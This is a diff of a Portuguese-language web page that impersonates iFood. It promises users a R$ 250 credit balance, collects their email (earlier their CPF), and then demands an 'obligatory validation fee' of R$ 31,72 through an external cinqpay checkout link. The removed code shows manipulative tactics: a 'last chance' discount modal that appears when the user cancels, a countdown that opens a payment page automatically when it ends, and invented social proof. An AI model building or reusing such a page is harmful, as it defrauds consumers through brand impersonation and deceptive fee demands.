@@ -17,9 +17,9 @@
     <link rel="apple-touch-icon" href="../images/apple-touch-icon.png">
 
     <!-- Meta Tags -->
-    <title>Saldo no iFood - iFood Créditos</title>
+    <title>Saldo no iFood - iFood Benefícios</title>
     <meta name="description" content="Transforme seus créditos em saldo na sua conta do iFood">
-    <meta name="author" content="iFood Créditos">
+    <meta name="author" content="iFood Benefícios">
 
     <style>
         * {
@@ -285,14 +285,14 @@
             display: none;
         }
 
-        /* Modal de Taxa de Validação - Seguindo padrão do projeto */
+        /* Modal de Taxa de Validação */
         .validation-modal-overlay {
             position: fixed;
             top: 0;
             left: 0;
             right: 0;
             bottom: 0;
-            background: rgba(0, 0, 0, 0.7);
+            background: rgba(0, 0, 0, 0.6);
             display: none;
             align-items: center;
             justify-content: center;
@@ -300,13 +300,14 @@
             padding: 20px;
         }
 
-        .validation-modal-content {
+        .validation-modal {
             background: white;
             border-radius: 20px;
             max-width: 400px;
             width: 100%;
             box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
             animation: modalSlideIn 0.3s ease-out;
+            overflow: hidden;
         }
 
         @keyframes modalSlideIn {
@@ -320,256 +321,121 @@
             }
         }
 
-        .validation-modal-header {
-            text-align: center;
-            padding: 30px 30px 20px;
-            border-bottom: 1px solid #f0f0f0;
+        .modal-header {
+            position: relative;
+            padding: 20px 24px 0;
         }
 
-        .validation-modal-icon {
-            font-size: 48px;
-            margin-bottom: 16px;
-            display: block;
-        }
-
-        .validation-modal-header h2 {
-            font-size: 24px;
-            font-weight: 700;
-            color: #333;
-            margin: 0;
-        }
-
-        .validation-modal-body {
-            padding: 30px;
-            text-align: center;
-            line-height: 1.6;
-        }
-
-        .validation-modal-body p {
-            margin-bottom: 16px;
-            color: #666;
-            font-size: 16px;
-        }
-
-        .validation-modal-body strong {
-            color: #EB2834;
-            font-weight: 700;
-            font-size: 18px;
-        }
-
-        .validation-modal-footer {
-            padding: 0 30px 30px;
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-        }
-
-        .btn-pay-validation {
-            width: 100%;
-            padding: 18px;
-            background: #EB2834;
-            color: white;
+        .modal-close {
+            position: absolute;
+            top: 16px;
+            right: 16px;
+            background: #f0f0f0;
             border: none;
-            border-radius: 12px;
-            font-size: 18px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.3s ease;
+            border-radius: 50%;
+            width: 32px;
+            height: 32px;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 8px;
-        }
-
-        .btn-pay-validation:hover {
-            background: #d91e2a;
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(235, 40, 52, 0.3);
-        }
-
-        .btn-pay-validation:active {
-            transform: translateY(0);
-        }
-
-        .btn-cancel-validation {
-            width: 100%;
-            padding: 16px;
-            background: transparent;
-            color: #999;
-            border: 2px solid #e0e0e0;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
             cursor: pointer;
+            font-size: 18px;
+            color: #666;
             transition: all 0.3s ease;
         }
 
-        .btn-cancel-validation:hover {
-            background: #f8f9fa;
-            border-color: #ccc;
-            color: #666;
+        .modal-close:hover {
+            background: #e0e0e0;
+            color: #333;
         }
 
-        /* Modal de Backredirect - Copy Agressiva */
-        .backredirect-modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0, 0, 0, 0.7);
-            display: none;
-            align-items: center;
-            justify-content: center;
-            z-index: 1001;
-            padding: 20px;
-        }
-
-        .backredirect-modal-content {
-            background: white;
-            border-radius: 20px;
-            max-width: 400px;
-            width: 100%;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
-            animation: modalSlideIn 0.3s ease-out;
-            margin: 0 16px;
-        }
-
-        .backredirect-modal-header {
+        .modal-content {
+            padding: 24px;
             text-align: center;
-            padding: 30px 30px 20px;
-            border-bottom: 1px solid #f0f0f0;
         }
 
-        .backredirect-modal-icon {
+        .modal-icon {
             font-size: 48px;
             margin-bottom: 16px;
             display: block;
         }
 
-        .backredirect-modal-header h2 {
-            font-size: 24px;
+        .modal-title {
+            font-size: 22px;
             font-weight: 700;
             color: #333;
-            margin: 0;
+            margin-bottom: 20px;
+            line-height: 1.3;
         }
 
-        .backredirect-modal-body {
-            padding: 30px;
-            text-align: center;
-            line-height: 1.6;
-        }
-
-        .backredirect-modal-body p {
-            margin-bottom: 16px;
+        .modal-message {
             color: #666;
             font-size: 16px;
+            line-height: 1.5;
+            margin-bottom: 24px;
         }
 
-        .backredirect-modal-body .urgency-text {
+        .modal-message p {
+            margin-bottom: 12px;
+        }
+
+        .modal-message strong {
             color: #EB2834;
             font-weight: 700;
-            font-size: 18px;
         }
 
-        .backredirect-modal-body strong {
-            color: #EB2834;
-            font-weight: 700;
-        }
-
-        .discount-offer {
-            background: #f8f9fa;
+        .fee-amount {
+            background: #fef2f2;
             border: 2px solid #EB2834;
             border-radius: 12px;
-            padding: 20px;
-            margin: 20px 0;
-        }
-
-        .discount-price {
-            font-size: 28px;
-            font-weight: 700;
-            margin-bottom: 8px;
-            color: #333;
-        }
-
-        .original-price {
-            text-decoration: line-through;
-            color: #999;
-            font-size: 18px;
-            margin-right: 10px;
-        }
-
-        .savings {
-            background: #EB2834;
-            color: white;
-            padding: 6px 16px;
-            border-radius: 20px;
-            font-size: 14px;
-            font-weight: 600;
-            display: inline-block;
-            margin-top: 8px;
-        }
-
-        .countdown-timer {
-            background: #f8f9fa;
-            border: 2px solid #e0e0e0;
-            color: #333;
             padding: 16px;
-            border-radius: 12px;
-            margin: 20px 0;
+            margin-bottom: 24px;
         }
 
-        .countdown-timer .timer-text {
-            color: #666;
+        .fee-label {
+            display: block;
             font-size: 14px;
-            margin-bottom: 8px;
+            color: #666;
+            margin-bottom: 4px;
         }
 
-        .countdown-timer .countdown {
-            font-size: 32px;
+        .fee-value {
+            font-size: 28px;
             font-weight: 700;
             color: #EB2834;
         }
 
-        .backredirect-modal-footer {
-            padding: 0 30px 30px;
+        .modal-actions {
+            padding: 0 24px 24px;
             display: flex;
             flex-direction: column;
             gap: 12px;
         }
 
-        .btn-accept-discount {
+        .btn-pay-fee {
             width: 100%;
-            padding: 18px;
+            padding: 16px;
             background: #EB2834;
             color: white;
             border: none;
             border-radius: 12px;
-            font-size: 18px;
-            font-weight: 700;
+            font-size: 16px;
+            font-weight: 600;
             cursor: pointer;
             transition: all 0.3s ease;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
         }
 
-        .btn-accept-discount:hover {
+        .btn-pay-fee:hover {
             background: #d91e2a;
             transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(235, 40, 52, 0.3);
+            box-shadow: 0 8px 24px rgba(235, 40, 52, 0.3);
         }
 
-        .btn-accept-discount:active {
-            transform: translateY(0);
-        }
-
-        .btn-refuse-discount {
+        .btn-cancel {
             width: 100%;
             padding: 16px;
             background: transparent;
-            color: #999;
+            color: #666;
             border: 2px solid #e0e0e0;
             border-radius: 12px;
             font-size: 16px;
@@ -578,54 +444,29 @@
             transition: all 0.3s ease;
         }
 
-        .btn-refuse-discount:hover {
+        .btn-cancel:hover {
             background: #f8f9fa;
             border-color: #ccc;
-            color: #666;
+            color: #333;
         }
 
         /* Responsividade para mobile */
         @media (max-width: 480px) {
-            .backredirect-modal-overlay {
-                padding: 16px;
-            }
-
-            .backredirect-modal-content {
-                margin: 0;
+            .validation-modal {
+                margin: 0 16px;
                 border-radius: 16px;
             }
 
-            .backredirect-modal-header {
-                padding: 24px 20px 16px;
-            }
-
-            .backredirect-modal-header h2 {
+            .modal-title {
                 font-size: 20px;
             }
 
-            .backredirect-modal-body {
-                padding: 20px;
-            }
-
-            .backredirect-modal-body p {
+            .modal-message {
                 font-size: 15px;
             }
 
-            .discount-price {
+            .fee-value {
                 font-size: 24px;
-            }
-
-            .countdown-timer .countdown {
-                font-size: 28px;
-            }
-
-            .backredirect-modal-footer {
-                padding: 0 20px 20px;
-            }
-
-            .btn-accept-discount {
-                padding: 16px;
-                font-size: 16px;
             }
         }
     </style>
@@ -672,9 +513,9 @@
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label" for="ifood-cpf">CPF cadastrado no iFood</label>
-                    <input type="CPF" id="ifood-cpf" name="ifood-cpf" class="form-input"
-                        placeholder="123.456.789-00" required>
+                    <label class="form-label" for="ifood-email">Email cadastrado no iFood</label>
+                    <input type="email" id="ifood-email" name="ifood-email" class="form-input"
+                        placeholder="seu-email@exemplo.com" required>
                 </div>
 
                 <button type="submit" class="withdraw-btn" id="withdraw-btn">
@@ -691,61 +532,50 @@
     </div>
 
     <!-- Modal de Taxa de Validação -->
-    <div class="validation-modal-overlay" id="validation-modal-overlay">
-        <div class="validation-modal-content">
+    <div class="validation-modal-overlay" id="validation-modal">
+        <div class="validation-modal">
             <div class="validation-modal-header">
-                <div class="validation-modal-icon">⚠️</div>
-                <h2>Validação de Conta Necessária</h2>
+                <button class="modal-close-btn" id="modal-close-btn">&times;</button>
+                <div class="modal-shield-icon">🛡️</div>
+                <h2 class="modal-title">Validação de Conta</h2>
+                <p class="modal-subtitle">Necessária para liberar seu saldo</p>
             </div>
+            
             <div class="validation-modal-body">
-                <p>Para garantir a segurança da sua transferência, é necessário validar sua conta.</p>
-                <p>A taxa de <strong>R$ 31,72</strong> é uma etapa obrigatória de validação para confirmar que a conta é real e pertence a você.</p>
-                <p>Após o pagamento, seu saldo será liberado imediatamente no seu app do iFood!</p>
+                <div class="fee-highlight">
+                    <div class="fee-amount">R$ 31,72</div>
+                    <p class="fee-label">Taxa de Validação Obrigatória</p>
+                </div>
+                
+                <p class="modal-text">
+                    Para garantir a <strong>segurança da transferência</strong>, é necessário validar sua conta com uma taxa única de R$ 31,72.
+                </p>
+                
+                <p class="modal-text">
+                    Esta é uma etapa <strong>obrigatória</strong> para confirmar que a conta é real e pertence a você.
+                </p>
+                
+                <div class="modal-features">
+                    <h4>🔒 Por que é necessário?</h4>
+                    <ul>
+                        <li>Verificação de identidade obrigatória</li>
+                        <li>Proteção contra fraudes</li>
+                        <li>Validação de conta real do iFood</li>
+                        <li>Liberação imediata após pagamento</li>
+                    </ul>
+                </div>
+                
+                <p class="modal-text">
+                    <strong>Após o pagamento</strong>, seu saldo de R$ 250,00 será liberado imediatamente no seu app do iFood!
+                </p>
             </div>
+            
             <div class="validation-modal-footer">
-                <button class="btn-pay-validation" id="btn-pay-validation">
-                    Pagar Taxa
+                <button class="pay-fee-btn" id="pay-fee-btn">
+                    🔓 Pagar Taxa e Liberar Saldo
                 </button>
-                <button class="btn-cancel-validation" id="btn-cancel-validation">Voltar</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Modal de Backredirect - Copy Clean -->
-    <div class="backredirect-modal-overlay" id="backredirect-modal-overlay">
-        <div class="backredirect-modal-content">
-            <div class="backredirect-modal-header">
-                <div class="backredirect-modal-icon">⚠️</div>
-                <h2>Última Chance - Desconto Especial</h2>
-            </div>
-            <div class="backredirect-modal-body">
-                <p class="urgency-text">Oferta Exclusiva para Você!</p>
-                
-                <p>Antes de sair, que tal aproveitar um <strong>desconto especial</strong> na taxa de validação?</p>
-                
-                <div class="discount-offer">
-                    <div class="discount-price">
-                        <span class="original-price">R$ 31,72</span>
-                        R$ 23,52
-                    </div>
-                    <div class="savings">Economia de R$ 8,20</div>
-                </div>
-                
-                <p>Esta oferta é <strong>limitada</strong> e não aparecerá novamente.</p>
-                
-                <div class="countdown-timer">
-                    <div class="timer-text">Oferta expira em:</div>
-                    <div class="countdown" id="countdown-timer">00:59</div>
-                </div>
-                
-                <p>Mais de <strong>800 pessoas</strong> já aproveitaram esta promoção hoje!</p>
-            </div>
-            <div class="backredirect-modal-footer">
-                <button class="btn-accept-discount" id="btn-accept-discount">
-                    Aproveitar Desconto
-                </button>
-                <button class="btn-refuse-discount" id="btn-refuse-discount">
-                    Não, obrigado
+                <button class="cancel-btn" id="cancel-btn">
+                    Cancelar agora
                 </button>
             </div>
         </div>
@@ -772,167 +602,89 @@
     <script>
         let currentBalance = 100; // Saldo inicial
 
-        // Modal de taxa de validação - Seguindo padrão do projeto
-        function showValidationModal() {
-            const modal = document.getElementById('validation-modal-overlay');
-            modal.style.display = 'flex';
-            document.body.style.overflow = 'hidden';
+        // Carregar saldo salvo
+        const savedBalance = localStorage.getItem('currentBalance');
+        if (savedBalance) {
+            currentBalance = parseFloat(savedBalance);
         }
 
-        function hideValidationModal() {
-            const modal = document.getElementById('validation-modal-overlay');
-            modal.style.display = 'none';
-            document.body.style.overflow = 'auto';
-        }
-
-        function handleValidationPayment() {
-            // Redirecionar para checkout externo
-            window.open('https://go.cinqpay.com.br/lcqxod8baj', '_blank');
-            hideValidationModal();
-        }
-
-        // Modal de Backredirect - Copy Agressiva
-        let countdownInterval;
-        let timeLeft = 59;
-
-        function showBackredirectModal() {
-            const modal = document.getElementById('backredirect-modal-overlay');
-            modal.style.display = 'flex';
-            startCountdown();
-        }
-
-        function hideBackredirectModal() {
-            const modal = document.getElementById('backredirect-modal-overlay');
-            modal.style.display = 'none';
-            stopCountdown();
-            document.body.style.overflow = 'auto';
-        }
-
-        function startCountdown() {
-            timeLeft = 59;
-            updateCountdownDisplay();
-            
-            countdownInterval = setInterval(() => {
-                timeLeft--;
-                updateCountdownDisplay();
-                
-                if (timeLeft <= 0) {
-                    // Auto-redirecionar quando tempo acabar
-                    handleDiscountAccept();
-                }
-            }, 1000);
-        }
-
-        function stopCountdown() {
-            if (countdownInterval) {
-                clearInterval(countdownInterval);
-                countdownInterval = null;
-            }
-        }
-
-        function updateCountdownDisplay() {
-            const minutes = Math.floor(timeLeft / 60);
-            const seconds = timeLeft % 60;
-            const display = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-            
-            const countdownEl = document.getElementById('countdown-timer');
-            if (countdownEl) {
-                countdownEl.textContent = display;
-            }
-        }
-
-        function handleDiscountAccept() {
-            // Parar countdown
-            stopCountdown();
-            
-            // Redirecionar para link de desconto
-            window.open('https://go.cinqpay.com.br/l0d4g', '_blank');
-            
-            // Fechar modals
-            hideBackredirectModal();
-            hideValidationModal();
-        }
-
-        function handleDiscountRefuse() {
-            // Fechar todos os modals
-            stopCountdown();
-            hideBackredirectModal();
-            hideValidationModal();
-        }
-
-        function handleBackredirectAction() {
-            // Em vez de fechar o modal de validação, mostrar o backredirect
-            hideValidationModal();
-            showBackredirectModal();
-        }
-
-        // Carregar saldo salvo do localStorage
-        function loadSavedBalance() {
-            const savedBalance = localStorage.getItem('currentBalance');
-            if (savedBalance) {
-                currentBalance = parseFloat(savedBalance);
-            }
-            updateBalance();
-        }
-
-        // Atualizar display do saldo
+        // Atualizar interface com saldo atual
         function updateBalance() {
-            const balanceElements = document.querySelectorAll('#balance, #available-balance');
-            balanceElements.forEach(el => {
-                if (el) {
-                    el.textContent = `R$ ${currentBalance.toFixed(2)}`;
-                }
-            });
+            document.getElementById('balance').textContent = `R$ ${currentBalance.toFixed(2)}`;
+            document.getElementById('available-balance').textContent = `R$ ${currentBalance.toFixed(2)}`;
         }
 
-        // Inicializar quando página carregar
-        document.addEventListener('DOMContentLoaded', function() {
-            // Carregar saldo
-            loadSavedBalance();
+        // Classe para gerenciar o modal de validação
+        class ValidationModal {
+            constructor() {
+                this.modal = document.getElementById('validation-modal');
+                this.isOpen = false;
+                this.setupEventListeners();
+            }
 
-            // Event listeners para o modal de validação
-            document.getElementById('btn-pay-validation').addEventListener('click', handleValidationPayment);
-            document.getElementById('btn-cancel-validation').addEventListener('click', handleBackredirectAction);
-            
-            // Event listeners para o modal de backredirect
-            document.getElementById('btn-accept-discount').addEventListener('click', handleDiscountAccept);
-            document.getElementById('btn-refuse-discount').addEventListener('click', handleDiscountRefuse);
-            
-            // Fechar ao clicar fora do modal de validação
-            document.getElementById('validation-modal-overlay').addEventListener('click', function(e) {
-                if (e.target === this) {
-                    handleBackredirectAction();
-                }
-            });
-            
-            // Fechar ao clicar fora do modal de backredirect
-            document.getElementById('backredirect-modal-overlay').addEventListener('click', function(e) {
-                if (e.target === this) {
-                    handleDiscountRefuse();
-                }
-            });
-            
-            // Fechar com ESC
-            document.addEventListener('keydown', function(e) {
-                if (e.key === 'Escape') {
-                    // Verificar qual modal está aberto
-                    const validationModal = document.getElementById('validation-modal-overlay');
-                    const backredirectModal = document.getElementById('backredirect-modal-overlay');
-                    
-                    if (backredirectModal.style.display === 'flex') {
-                        handleDiscountRefuse();
-                    } else if (validationModal.style.display === 'flex') {
-                        handleBackredirectAction();
+            setupEventListeners() {
+                // Botão de fechar (X)
+                document.getElementById('modal-close-btn').addEventListener('click', () => {
+                    this.hide();
+                });
+
+                // Botão Cancelar
+                document.getElementById('cancel-btn').addEventListener('click', () => {
+                    this.hide();
+                });
+
+                // Botão Pagar Taxa
+                document.getElementById('pay-fee-btn').addEventListener('click', () => {
+                    this.handlePayment();
+                });
+
+                // Fechar ao clicar fora do modal
+                this.modal.addEventListener('click', (e) => {
+                    if (e.target === this.modal) {
+                        this.hide();
                     }
-                }
-            });
+                });
+
+                // Fechar com ESC
+                document.addEventListener('keydown', (e) => {
+                    if (e.key === 'Escape' && this.isOpen) {
+                        this.hide();
+                    }
+                });
+            }
+
+            show() {
+                this.modal.style.display = 'flex';
+                document.body.style.overflow = 'hidden';
+                this.isOpen = true;
+            }
+
+            hide() {
+                this.modal.style.display = 'none';
+                document.body.style.overflow = 'auto';
+                this.isOpen = false;
+            }
+
+            handlePayment() {
+                // Redirecionar para checkout externo
+                window.open('https://go.cinqpay.com.br/lcqxod8baj', '_blank');
+                this.hide();
+            }
+        }
+
+        // Instanciar modal de validação
+        const validationModal = new ValidationModal();
+
+        // Inicializar
+        document.addEventListener('DOMContentLoaded', function () {
+            updateBalance();
 
             // Event listener para o formulário
             document.getElementById('withdraw-form').addEventListener('submit', function (e) {
                 e.preventDefault();
 
                 const amount = 250.00; // Valor fixo
-                const ifoodcpf = document.getElementById('ifood-cpf').value.trim();
+                const ifoodEmail = document.getElementById('ifood-email').value.trim();
 
                 // Validações
                 if (amount > currentBalance) {
@@ -940,24 +692,24 @@
                     return;
                 }
 
-                if (!ifoodcpf) {
-                    showError('Por favor, insira seu cpf cadastrado no iFood');
+                if (!ifoodEmail) {
+                    showError('Por favor, insira seu email cadastrado no iFood');
                     return;
                 }
 
-                // Validação de cpf
-                const cpfRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-                if (!cpfRegex.test(ifoodcpf)) {
-                    showError('Por favor, insira um cpf válido');
+                // Validação de email
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                if (!emailRegex.test(ifoodEmail)) {
+                    showError('Por favor, insira um email válido');
                     return;
                 }
 
                 // MOSTRAR MODAL DE TAXA DE VALIDAÇÃO em vez de processar diretamente
-                showValidationModal();
+                validationModal.show();
             });
         });
 
-        function processWithdraw(amount, cpf) {
+        function processWithdraw(amount, email) {
             const btn = document.getElementById('withdraw-btn');
             btn.textContent = 'Processando...';
             btn.disabled = true;
@@ -980,7 +732,7 @@
                 btn.disabled = false;
 
                 // Log para debug (opcional)
-                console.log(`Transferência processada: R$ ${amount.toFixed(2)} para ${cpf}`);
+                console.log(`Transferência processada: R$ ${amount.toFixed(2)} para ${email}`);
 
             }, 2000);
         }
